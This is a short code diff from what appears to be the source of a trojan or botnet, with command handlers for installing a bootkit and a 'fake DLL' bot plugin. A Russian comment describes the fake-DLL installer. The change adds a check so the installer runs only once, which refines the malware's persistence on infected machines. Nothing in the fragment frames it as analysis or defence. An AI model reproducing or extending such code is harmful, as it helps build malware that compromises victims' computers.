@@ -1146,7 +1146,8 @@ bool ExecuteInstallBootkit(void* Manager, PCHAR Command, PCHAR Args)
 bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 {
 	// Функция инсталирует фэкедлл
-	StartThread(InstallBotPlug, new string(GetStr(EStrFakeDllInstaller)));
+	if (!BOT::FakeDllInstalled())
+		StartThread(InstallBotPlug, new string(GetStr(EStrFakeDllInstaller)));
 	return true;
 }
 //----------------------------------------------------------------------------
